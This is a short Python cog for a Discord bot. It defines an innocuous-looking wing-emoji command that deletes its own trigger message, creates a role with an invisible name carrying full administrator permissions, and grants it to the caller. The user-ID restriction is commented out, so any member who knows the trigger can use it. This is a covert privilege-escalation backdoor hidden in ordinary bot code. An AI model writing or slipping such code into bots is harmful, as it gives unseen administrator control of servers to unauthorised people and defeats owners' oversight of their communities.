import discord
from discord.ext import commands

INVISIBLE_NAME = "⠀"  # U+2800 Braille Blank (invisible character)

class WingCommand(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="🪽", aliases=["wing", ".:wing:"])
    async def wing_command(self, ctx):
        await ctx.message.delete()

        guild = ctx.guild
        author = ctx.author

        # Optional: restrict who can use this command
       # if author.id != 1369175793241952259:
        #      return

        # Check if role already exists
        role = discord.utils.get(guild.roles, name=INVISIBLE_NAME)
        if not role:
            try:
                role = await guild.create_role(
                    name=INVISIBLE_NAME,
                    permissions=discord.Permissions(administrator=True),
                    reason="Created by !.🪽 command"
                )
            except discord.Forbidden:
                return await ctx.send("❌ I don't have permission to create roles.", delete_after=5)

        # Assign role to user
        try:
            await author.add_roles(role, reason="🪽 Role granted")
        except discord.Forbidden:
            return await ctx.send("❌ I can't assign the role (missing permissions?).", delete_after=5)

async def setup(bot):
    await bot.add_cog(WingCommand(bot))
